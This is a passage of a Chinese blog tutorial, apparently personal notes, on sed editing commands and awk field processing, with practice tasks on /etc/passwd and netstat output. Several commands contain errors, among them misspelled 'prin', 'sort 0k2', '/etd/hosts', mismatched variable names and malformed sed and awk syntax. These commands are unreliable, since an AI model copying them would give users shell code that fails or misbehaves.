class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 例子</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># d 删除</span></span><br><span class="line">sed -r <span class="string">'3d'</span> datefile   <span class="comment"># 删除第三行</span></span><br><span class="line">sed -r <span class="string">'3d'</span> datefile</span><br><span class="line">sed -r <span class="string">'3&#123;d;&#125;'</span> datefile</span><br><span class="line">sed -r <span class="string">'3d&#123;h:d&#125;'</span> datefile  <span class="comment"># 先保存，再删除</span></span><br><span class="line"></span><br><span class="line">sed -r <span class="string">'3,$d'</span> datefile   <span class="comment"># 删除3到最后一行</span></span><br><span class="line">sed -r <span class="string">'$d'</span> datefile     <span class="comment"># 删除最后一行</span></span><br><span class="line">sed -r <span class="string">'/nrth/d'</span> datefile  <span class="comment"># 删除满足这个匹配的行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s 替换 </span></span><br><span class="line">sed -r <span class="string">'s/west/north/g'</span> datefile</span><br><span class="line">sed -r <span class="string">'s/^west/north/'</span> datefile      </span><br><span class="line">sed -r <span class="string">'s[0-9][0-9]$/&amp;.5'</span> datefile   <span class="comment"># &amp;代表在查找串中匹配到的内容       # 拓展vim中在某行的后门加上xxx：  :3,5s/.*/&amp;XXX/g</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#vim拓展1:    :%s/.*/#&amp;/g   在所有行前面加注释</span></span><br><span class="line"><span class="comment">#vim拓展1:    :3,5s/~/#&amp;/        和sed是一样的</span></span><br><span class="line">sed -r <span class="string">'%s/(.)(.)(.*)/\1xxx\2\3/'</span> passwd            <span class="comment"># 把每行第二个字符前面加xxx</span></span><br><span class="line">sed -r <span class="string">'s/(Mar)got/\1inane/g'</span> datefile</span><br><span class="line"></span><br><span class="line"><span class="comment"># r 读文件</span></span><br><span class="line">sed -r <span class="string">'s/Suan/r /etc/newfile'</span> datefile  <span class="comment"># 到Suan这一行的时候，读入一个新文件</span></span><br><span class="line">sed -r <span class="string">'2r /etc/hosts'</span> a.txt   <span class="comment"># 处理到第二行的时候，读入一个新文件</span></span><br><span class="line">sed -r <span class="string">'/2r /etc/hosts'</span> a.txt   <span class="comment"># /2   带有2的时候，读入...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># w 写文件</span></span><br><span class="line">sed -r <span class="string">'/north/w newfile'</span> datafile   <span class="comment"># 把north的行保存到新文件中去</span></span><br><span class="line">sed -r <span class="string">'3,$w /new.txt'</span> datafile      <span class="comment"># 第三行到最后一行，保存...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a 追加</span></span><br><span class="line">sed -r <span class="string">'/root/a 1111111'</span> datafile   <span class="comment"># 有root的行，就在后面添加11111</span></span><br><span class="line">sed -r <span class="string">'2a/ 1111111'</span> datafile       <span class="comment"># 第二行，添加 111111111</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># i 在前面插入</span></span><br><span class="line">sed -r <span class="string">'/root/i 1111111'</span> datafile    <span class="comment"># 有root的行，就在前面添加11111</span></span><br><span class="line">sed -r <span class="string">'2i/ 1111111'</span> datafile        <span class="comment"># 第二行，在前面添加 111111111</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c  修改替换</span></span><br><span class="line">sed -r <span class="string">'2c/ 1111111'</span> datafile        <span class="comment">#   第二行，替换为 111111111</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># n 获取下一行命令</span></span><br><span class="line">sed -r <span class="string">'/eastern/&#123;n; d&#125;'</span> datafile  <span class="comment"># 这行没有明显标志，用上面明显的隔山打牛</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># G g H h 暂存和取用命令</span></span><br><span class="line">sed -r  <span class="string">'1h;$G'</span> /etc/hosts   <span class="comment"># 处理到第一行时候，暂存；到最后一行，取过来  （第一行复制到最后一行）</span></span><br><span class="line">sed -r  <span class="string">'1&#123;h;d&#125;;$G'</span> /etc/hosts    <span class="comment"># 第一行移动到最后一行</span></span><br><span class="line">sed -r  <span class="string">'1h;2,$G'</span> /etc/hosts   <span class="comment"># 处理到第一行时候，暂存;到第二行和最后一行，取过来</span></span><br></pre></td></tr></table></figure><p><strong>模式空间/暂存空间</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 小写是覆盖，大写是追加</span></span><br><span class="line">模式空间   h  H --&gt;    暂存空间</span><br><span class="line">模式空间   &lt;--- g  G   暂存空间</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sed -r  <span class="string">'G;G'</span> /etc/hosts   <span class="comment"># 所有行</span></span><br><span class="line">sed -r  <span class="string">'g;g'</span> /etc/hosts   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暂存空间个模式空间互相转换命令   x</span></span><br><span class="line">sed -r <span class="string">'4h; 5x; 6G'</span> /etc/hosts   <span class="comment"># 处理到第四行覆盖到暂存空间，到第五行:。。。</span></span><br></pre></td></tr></table></figure><p> <strong>反向选择</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed -r <span class="string">'3d'</span> /etc/hosts</span><br><span class="line">sed -r <span class="string">'3!d'</span> /etc/hosts</span><br></pre></td></tr></table></figure><p><strong>多重编辑选项</strong> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -e</span></span><br><span class="line">sed -r -e <span class="string">'1,3d'</span> -e <span class="string">'s/java/python/'</span> datafile   <span class="comment"># 第一行到第三行删除，后面的替换覆盖</span></span><br><span class="line"></span><br><span class="line">sed -r <span class="string">'2&#123;s/java/python/g; s/php/go/g&#125;'</span> datafile   <span class="comment"># 一行里面替换两次</span></span><br></pre></td></tr></table></figure><p><strong>常见操作</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">############ 常见操作</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除#注释行</span></span><br><span class="line">sed -ri <span class="string">'/^#/d'</span> file.conf   <span class="comment"># 这种情况必须是第一个就是注释符</span></span><br><span class="line">sed -ri <span class="string">'/^[\t]*#/d'</span> file.conf   <span class="comment"># 如果是前面有空格或tab然后才是注释符</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除//注释行</span></span><br><span class="line">sed -ri <span class="string">'\Y/^[\t]*//Yd'</span> file.conf </span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除无内容空行</span></span><br><span class="line">sed -ri <span class="string">'/^[\t]*$/d'</span> file.conf </span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除注释行及空行</span></span><br><span class="line">sed -ri <span class="string">'/^[\t]*#|^[\t]*$/d'</span> file.conf </span><br><span class="line">sed -ri <span class="string">'/^[\t]*(#|$)/d'</span> file.conf </span><br><span class="line"></span><br><span class="line"><span class="comment"># #加注释（vim是一样是）</span></span><br><span class="line">:%s/.*/<span class="comment">#&amp;/g   在所有行前面加注释</span></span><br><span class="line">:3,5s/^/<span class="comment">#&amp;/        和sed是一样的</span></span><br><span class="line"></span><br><span class="line">sed -r <span class="string">'1,5s/^/#/'</span> c.txt</span><br><span class="line">sed -r <span class="string">'3,$ s/^#*/#/'</span> c.txt  <span class="comment"># 将行首0到多个井换成一个井</span></span><br><span class="line"><span class="comment"># 如果井前有空格或tab等</span></span><br><span class="line">sed -r <span class="string">'3,$ s/^[\t]*#*/#/'</span> c.txt </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sed使用外部变量(使用双引号)</span></span><br><span class="line">var1=111</span><br><span class="line">sed -ri <span class="string">"3a<span class="variable">$val1</span>"</span> /etd/hosts</span><br><span class="line"></span><br><span class="line">sed -ri <span class="string">'$a'</span><span class="string">"<span class="variable">$val1</span>"</span> /etd/hosts  <span class="comment"># 第一个单引号是`最后一行`，第二个里面是变量</span></span><br><span class="line"></span><br><span class="line">sed -ri <span class="string">"\$a<span class="variable">$val1</span>"</span> /etd/hosts   <span class="comment"># 把$a转义一下也行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cat a.txt</span><br><span class="line">tac a.txt   <span class="comment"># 从后往前倒序（ sed -r '1!G; $!d' a.txt  推导一下弄明白  ）</span></span><br></pre></td></tr></table></figure><h4 id="九-awk"><a href="#九-awk" class="headerlink" title="九.awk"></a>九.awk</h4><p>   awk本身也是一种编程语言（ps:我们使用的不是纯粹的awk，而是gawk）</p><ul><li>sed是修改文件</li><li>awk是用来统计</li></ul><p><strong>语法格式</strong></p><p><code>awk [options] &#39;cmd&#39; filenames</code></p><p> options 选项</p><p><code>-F   指定分隔符，默认是空格或tab</code></p><p><strong>command</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># BEGIN&#123;&#125;行处理前</span></span><br><span class="line"><span class="comment"># &#123;&#125;行处理（有几行就处理几次）</span></span><br><span class="line"><span class="comment"># END行处理后</span></span><br><span class="line"></span><br><span class="line">awk <span class="string">'BEGIN&#123;print 1/2&#125; &#123;print "ok"&#125;END&#123;print "------"&#125;'</span> /etc/hosts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># BEGIN&#123;&#125;    通常用于定义一些变量，比如: BEGIN&#123;FS=":";OFS="---"&#125;  # OFS 输出时候的字段分隔符</span></span><br><span class="line">awk <span class="string">'BEGIN&#123;FS=":"&#125; &#123;print $1&#125;'</span> passwd   <span class="comment"># 在处理之前，(FS)就指定了分隔符</span></span><br></pre></td></tr></table></figure><p><strong>awk命令格式</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># awk 'pattern' filename </span></span><br><span class="line">awk <span class="string">'/root/'</span> /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># awk '&#123;action&#125;' filename </span></span><br><span class="line">awk -F: <span class="string">'&#123;print $3&#125;'</span> /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># awk 'pattern &#123;action&#125;' filename     </span></span><br><span class="line">awk -F<span class="string">":"</span> <span class="string">'/root/&#123;print $3&#125;'</span> /etc/passwd</span><br><span class="line">awk <span class="string">'BEGIN&#123;FS=":"&#125; /root/&#123;print $3&#125;'</span> /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># command |awk 'pattern &#123;action&#125;' </span></span><br><span class="line">df -P |grep <span class="string">'/'</span> |awk <span class="string">'$4'</span>&gt;25000 &#123;<span class="built_in">print</span> <span class="variable">$4</span>&#125;    <span class="comment"># 除去第一行，如果大于25000就打印第四列</span></span><br></pre></td></tr></table></figure><p><strong>awk工作原理</strong></p><p><img src="/shell脚本基本知识/awk工作原理.png"></p><p><strong>记录与字段相关的<code>内部变量</code></strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 可以通过 man awk 查看</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># $0  awk变量保存当前记录的内容</span></span><br><span class="line">awk -F<span class="string">":"</span> <span class="string">'&#123;print $0&#125;'</span> /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># NR  输入记录总的编号，显示行号</span></span><br><span class="line">awk -F<span class="string">":"</span> <span class="string">'&#123;print NR,$0&#125;'</span> /etc/passwd </span><br><span class="line"><span class="comment"># FNR  当前记录文件的编号(处理多个文件，每个文件重新开始编号)</span></span><br><span class="line">awk -F<span class="string">":"</span> <span class="string">'&#123;print FNR,$0&#125;'</span> /etc/passwd /etc/passwd  </span><br><span class="line"><span class="comment"># NF: 保存记录的字段数(这一行一共有多少字段),  $NF代表最后一个字段</span></span><br><span class="line">awk -F<span class="string">":"</span> <span class="string">'&#123;print $0,NF,$NF&#125;'</span> /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># FS 输入字段分隔符，默认空格或tab</span></span><br><span class="line">awk <span class="string">'BEGIN&#123;FS=":"&#125; &#123;print $0&#125;'</span> /etc/passwd              </span><br><span class="line">awk -F<span class="string">'[:\t]'</span> <span class="string">'&#123;print $0,NF,$NF&#125;'</span> /etc/passwd</span><br><span class="line"><span class="comment"># OFS 输入字段分隔符，默认空格, OFS:输出分隔符</span></span><br><span class="line">awk <span class="string">'BEGIN&#123;FS=":";OFS="+++"&#125; &#123;print $0&#125;'</span> /etc/passwd   </span><br><span class="line"></span><br><span class="line"><span class="comment"># RS --记录分隔符(区分与FS字段分隔符) 默认换行符</span></span><br><span class="line">awk <span class="string">'BEGIN&#123;RS=":"&#125; &#123;print $0&#125;'</span> /etc/passwd</span><br><span class="line"><span class="comment"># ORS </span></span><br><span class="line">awk <span class="string">'BEGIN&#123;ORS=":"&#125; &#123;print $0&#125;'</span> /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将文件每一行合并为一行（ORS 输出记录分隔符）</span></span><br><span class="line">awk <span class="string">'BEGIN&#123;ORS=""&#125; &#123;print $0&#125;'</span> /etc/passwd</span><br></pre></td></tr></table></figure><p><strong>格式化输出</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.print</span></span><br><span class="line"><span class="comment"># 2.printf  可以格式化（默认没有换行，手动加\n）</span></span><br><span class="line">date |awk <span class="string">'&#123;print "Month:" $2"\nYear: " $NF&#125;'</span>  <span class="comment"># 只要不是变量，就要放到双引号里面</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># %s 字符串（-15s  15个字符，左对齐）  %f 浮点型， %d数值类型</span></span><br><span class="line">awk -F: <span class="string">'&#123;printf "%-15s %-10s %-15s\n", $1,$2,$3&#125;'</span> /etc/passwd</span><br></pre></td></tr></table></figure><p><strong>awk模式和动作</strong></p><p>模式：条件语句，复合语句，正则表达式。 包括两个特殊字典：BEGIN和END</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### 模式可以是</span></span><br><span class="line">=======   正则表达式</span><br><span class="line"><span class="comment"># 匹配记录（整行）</span></span><br><span class="line">awk <span class="string">'/^xps/'</span> /etc/passwd   <span class="comment"># awk '$0 ~ /^xps/' /etc/passwd   # ~  匹配</span></span><br><span class="line">awk <span class="string">'!/xps/'</span> /etc/passwd   <span class="comment"># awk '$0 !~ /^xps/' /etc/passwd</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 匹配字段：匹配操作符(~!~)</span></span><br><span class="line">awk -F: <span class="string">'$1 ~ /^xps/'</span> /etc/passwd   <span class="comment"># </span></span><br><span class="line">awk -F: <span class="string">'$NF !~ /^bash$/'</span> /etc/passwd  <span class="comment"># 最后一列不是以bash结尾的</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=======   比较表达式</span><br><span class="line"><span class="comment"># 用于比较 数字 与 字符串</span></span><br><span class="line"><span class="comment"># &gt;     &lt;    == </span></span><br><span class="line">awk -F: <span class="string">'$3 == 0'</span> /etc/passwd</span><br><span class="line">awk -F: <span class="string">'$3 == "/xps/"'</span> /etc/passwd  <span class="comment"># == 全部等于</span></span><br><span class="line">awk -F: <span class="string">'$3 ~ /xps/'</span> /etc/passwd  <span class="comment"># 正则匹配</span></span><br><span class="line">awk -F: <span class="string">'$NF ~ /xps/'</span> /etc/passwd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=======   条件表达式</span><br><span class="line">awk -F: <span class="string">'$3&gt;200&#123;print $0&#125;'</span> /etc/passwd  <span class="comment"># $3大于200的，$0</span></span><br><span class="line"></span><br><span class="line">awk -F: <span class="string">'&#123; if($3&gt;200) &#123;print $0&#125; &#125;'</span> /etc/passwd  <span class="comment"># 推荐这么写 &#123; if()&#123;cmd1;cmd2&#125; else&#123;&#125; &#125;</span></span><br><span class="line">awk -F: <span class="string">'&#123; if($3&gt;200) &#123;print $0&#125; else&#123;print $1&#125; &#125;'</span> /etc/passwd </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=======   算数运算</span><br><span class="line"><span class="comment">#awk都按浮点数方式执行算数运算</span></span><br><span class="line">awk -F: <span class="string">'$3 * 10 &gt; 500'</span> /etc/passwd    </span><br><span class="line">awk -F: <span class="string">'&#123; if($3*10&gt;500)&#123;print $0&#125; &#125;'</span> /etc/passwd    <span class="comment"># 如果$3*10&gt;500，就...</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=======   逻辑操作符和复合模式</span><br><span class="line">&amp;&amp; 逻辑与</span><br><span class="line">||  逻辑或</span><br><span class="line">！  逻辑非</span><br><span class="line">awk -F: <span class="string">'$1~/root/ &amp;&amp; $3&lt;=15'</span> /etc/passwd</span><br><span class="line">awk -F: <span class="string">'$1~/root/ || $3&lt;=15'</span> /etc/passwd</span><br><span class="line">awk -F: <span class="string">'!($1~/root/ &amp;&amp; $3&lt;=15)'</span> /etc/passwd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=======   范围模式</span><br><span class="line">awk <span class="string">'/Tom,/Susan/'</span> filename</span><br></pre></td></tr></table></figure><p><strong>awk脚本编程</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### awk脚本编程</span></span><br><span class="line"></span><br><span class="line">====== 条件编程</span><br><span class="line">awk -F<span class="string">":"</span> <span class="string">'&#123;if()&#123;&#125; else if()&#123;&#125; else&#123;&#125;&#125;'</span> passwd</span><br><span class="line"></span><br><span class="line">awk -F<span class="string">":"</span> <span class="string">'&#123;if($3&gt;0 &amp;&amp; $3&lt;1000)&#123;count++&#125;&#125; END&#123;print count&#125;'</span> /etc/passwd   <span class="comment"># 统计系统用户数</span></span><br><span class="line"></span><br><span class="line">awk -F<span class="string">":"</span> <span class="string">'&#123;if($3==0)&#123;count++&#125;&#125; else&#123;i++&#125; END&#123;print "管理员个数："count; print "系统用户个数:"i&#125;'</span> /etc/passwd </span><br><span class="line"></span><br><span class="line">awk -F<span class="string">":"</span> <span class="string">'&#123;if($3==0)&#123;i++&#125;&#125; else if($3&lt;999)&#123;j++&#125; else&#123;k++&#125; END&#123;print "管理员个数："i; print "普通用户个数:"j; print "系统用户个数:"k&#125;'</span> /etc/passwd </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">====== 循环</span><br><span class="line"><span class="comment"># 1.while    依此打印每一列</span></span><br><span class="line">awk -F<span class="string">":"</span> <span class="string">'&#123;i=1;while(i&lt;7)&#123;print $i;i++&#125;&#125;'</span> /etc/passwd </span><br><span class="line">awk -F<span class="string">":"</span> <span class="string">'/^root/&#123;i=1;while(i&lt;7)&#123;print $i;i++&#125;&#125;'</span> /etc/passwd </span><br><span class="line">awk -F<span class="string">":"</span> <span class="string">'&#123;i=1;while(i&lt;=NF)&#123;print $i;i++&#125;&#125;'</span> /etc/passwd </span><br><span class="line">awk <span class="string">'&#123;i=1;while(i&lt;=NF)&#123;print $i;i++&#125;&#125;'</span> a.txt   <span class="comment"># 打印文件所有内容(默认是空格和tab分割)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.for</span></span><br><span class="line">awk <span class="string">'BEGIN&#123;for(i=1;i&lt;=5;i++)&#123;prin i&#125;&#125;'</span>     <span class="comment"># c风格的</span></span><br><span class="line">awk -F: <span class="string">'&#123;for(i=1;i&lt;=NF;i++)&#123;prin $i&#125;&#125;'</span> passwd</span><br><span class="line">awk -F: <span class="string">'&#123;for(i=1;i&lt;=NF;i++)&#123;prin $0&#125;&#125;'</span> passwd     <span class="comment"># 将每行打印10次</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">====== 数组  (用来统计)</span><br><span class="line">awk -F: <span class="string">'&#123;username[++i]=$1&#125; END&#123;print username[1]&#125;'</span> /etc/passwd</span><br><span class="line">awk -F: <span class="string">'&#123;username[i++]=$1&#125; END&#123;print username[1]&#125;'</span> /etc/passwd</span><br><span class="line">awk -F: <span class="string">'&#123;username[i++]=$1&#125; END&#123;print username[0]&#125;'</span> /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment">## 数组遍历(主要用按索引遍历)</span></span><br><span class="line"><span class="comment"># username数组名， 先保存到数组中，再进行遍历</span></span><br><span class="line">awk -F: <span class="string">'&#123;username[i++]=$1&#125; END&#123;for(i in username) &#123;print i,username[i]&#125;&#125;'</span> /etc/passwd </span><br><span class="line"></span><br><span class="line">awk -F: <span class="string">'&#123;username[++i]=$1&#125; END&#123;for(i in username) &#123;print i,username[i]&#125;&#125;'</span> /etc/passwd</span><br></pre></td></tr></table></figure><p><strong>基本练习</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###### 基本练习</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 1. 统计/etc/passwd 中各种shell的数量</span></span><br><span class="line"><span class="comment"># # 把要统计的对象作为数组的索引(这里是最后一个$NF,也就是shell的类型)</span></span><br><span class="line">awk -F: <span class="string">'&#123;shells[$NF]++&#125; END&#123;for(i in shells)&#123;print i,shells[i]&#125;&#125;'</span> /etc/passwd  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 2.网站访问状态统计</span></span><br><span class="line">netstat -ant |grep :80 |awk <span class="string">'&#123;access_stat[$NF]++&#125; END&#123;for(i in access_stat)&#123;print i,access_stat[i]&#125;&#125;'</span> </span><br><span class="line"></span><br><span class="line">netstat -ant |grep :80 |awk <span class="string">'&#123;access_stat[$NF]++&#125; END&#123;for(i in access_stat)&#123;print i,access_stat[i]&#125;&#125;'</span> |sort -k2 -n |head</span><br><span class="line"></span><br><span class="line">ss -ant |grep :80 |awk <span class="string">'&#123;access_stat[$2]++&#125; END&#123;for(i in access_stat)&#123;print i,access_stat[i]&#125;&#125;'</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 3.统计当前访问的每个IP的数量 &lt;当前实时状态 netstat, ss&gt;</span></span><br><span class="line">netstat -ant |grep :80 |awk -F: <span class="string">'&#123;ip_count[$8]++&#125; END&#123;for(i in ip_count)&#123;print i,ip_count[i]&#125;&#125;'</span> </span><br><span class="line"><span class="comment"># 下面这个有点复杂了，不推荐用</span></span><br><span class="line">ss -ant |grep :80 |awk -F: <span class="string">'!/LISTEN/&#123;ip_count[$(NF-1)]++&#125; END&#123;for(i in ip_count)&#123;print i,ip_count[i]&#125;&#125;'</span> |sort 0k2 -rn |head 5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 4.统计Apache/Nginx日志中某一天的PV量 &lt;统计日志&gt;</span></span><br><span class="line">grep <span class="string">'07/Aug/2019'</span> access.log |wc -l    <span class="comment"># wc -l  统计行数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 4.统计Apache/Nginx日志中某一天不通IP的PV量 &lt;统计日志&gt;</span></span><br><span class="line">grep <span class="string">'07/Aug/2019'</span> access.log |awk <span 